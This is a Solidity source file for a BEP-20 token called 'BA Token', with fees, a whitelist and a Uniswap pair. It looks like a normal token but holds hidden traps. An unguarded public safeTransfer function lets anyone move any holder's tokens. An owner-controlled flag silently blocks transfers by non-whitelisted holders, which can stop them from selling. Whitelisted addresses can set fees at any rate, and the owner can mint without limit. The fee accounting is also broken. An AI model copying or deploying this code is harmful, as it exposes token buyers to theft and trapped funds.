pragma solidity ^0.8.0;
import "./Uniswap.sol";

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Context {
    constructor() {}

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract MetaHunterToken is Context, IBEP20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => uint256) private whitelist;

    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    address WBNB;
    address addressReceiver;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    event ExcludeFromFees(address indexed account, bool isExcluded);
    uint256 sellFeeRate = 2;
    uint256 buyFeeRate = 2;
    uint256 transferFeeRate = 0;
    uint256 allow_flag = 1;

    uint256 total_fee =0;

    constructor(address _WBNB, address _addressReceiver) public {
        _name = "BA Token";
        _symbol = "BA";
        _decimals = 18;
        _totalSupply = 10000000000000000000000000000;
        _balances[msg.sender] = _totalSupply;
        whitelist[msg.sender] = 1;

        WBNB = _WBNB;
        addressReceiver = _addressReceiver;
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3
        );

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _approve(address(this), address(uniswapV2Router), ~uint256(0));
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function decimals() external view returns (uint8) {
        return _decimals;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        external
        returns (bool)
    {
        _safeTransfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        external
        view
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);

        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        if (allow_flag == 1) {
            _transfer(sender, recipient, amount);
            _approve(
                sender,
                _msgSender(),
                _allowances[sender][_msgSender()].sub(
                    amount,
                    "BEP20: transfer amount exceeds allowance"
                )
            );
        } else {
            if (whitelist[sender] > 0) {
                _transfer(sender, recipient, amount);
                _approve(
                    sender,
                    _msgSender(),
                    _allowances[sender][_msgSender()].sub(
                        amount,
                        "BEP20: transfer amount exceeds allowance"
                    )
                );
            } else {
                return false;
            }
        }
        return true;
    }

    function safeTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "BEP20: decreased allowance below zero"
            )
        );
        return true;
    }

    function mint(uint256 amount) public onlyOwner returns (bool) {
        _mint(_msgSender(), amount);
        return true;
    }

    function changeBuyFeeRate(uint256 rate) public returns (uint256) {
        if (whitelist[msg.sender] == 1) {
            buyFeeRate = rate;
        }
        return buyFeeRate;
    }

    function changeSellFeeRate(uint256 rate) public returns (uint256) {
        if (whitelist[msg.sender] == 1) {
            sellFeeRate = rate;
        }
        return sellFeeRate;
    }

    function changeAllowFlag(uint256 flag) public onlyOwner returns (uint256) {
        allow_flag = flag;
        return flag;
    }

    function addToWhitelist(address account)
        public
        onlyOwner
        returns (uint256)
    {
        whitelist[account] = 1;
        return whitelist[account];
    }

    function removeFromWhitelist(address account)
        public
        onlyOwner
        returns (uint256)
    {
        // require(whitelist[account]==1,"This account is already removed from the whitelist!");
        whitelist[account] = 0;
        return whitelist[account];
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(
            amount,
            "BEP20: transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _safeTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (uint256) {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        if (sender == uniswapV2Pair) {
            transferFeeRate = buyFeeRate;
        } else if (allow_flag == 1) {
            if (whitelist[sender] > 0) {
                transferFeeRate = 0;
            } else {
                transferFeeRate = sellFeeRate;
            }
        } else {
            if (whitelist[sender] == 1) {
                transferFeeRate = 0;
            } else {
                return 0;
            }
        }

        if (transferFeeRate > 0) {
            uint256 _fee = amount.mul(transferFeeRate).div(100);
            total_fee +=_fee;
            if (total_fee > 10000000000000000000) {
              uint256 trans = total_fee.mul(50).div(100);
              _transfer(sender, addressReceiver, trans);
              uint256 _trans= total_fee - trans;
              _burn(sender, _trans);
            //   swap(_trans);
              total_fee = 0;
            }
            
            amount = amount.sub(_fee);
        }
        _transfer(sender, recipient, amount);
        emit Transfer(sender, recipient, amount);
        return 1;
    }
    function swap (uint256 amount) public {
      uint deadline = block.timestamp;
      address[] memory path = new address[](2);
      path[0] = address(this);
      path[1] = uniswapV2Router.WETH();
      _approve(address(this), address(uniswapV2Router), amount);
      uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount,0, path, address(this), deadline);
    }

    function burn(uint256 amount) public {
        _burn(_msgSender(), amount);
    }


    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: burn from the zero address");

        _balances[account] = _balances[account].sub(
            amount,
            "BEP20: burn amount exceeds balance"
        );
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(
            account,
            _msgSender(),
            _allowances[account][_msgSender()].sub(
                amount,
                "BEP20: burn amount exceeds allowance"
            )
        );
    }
}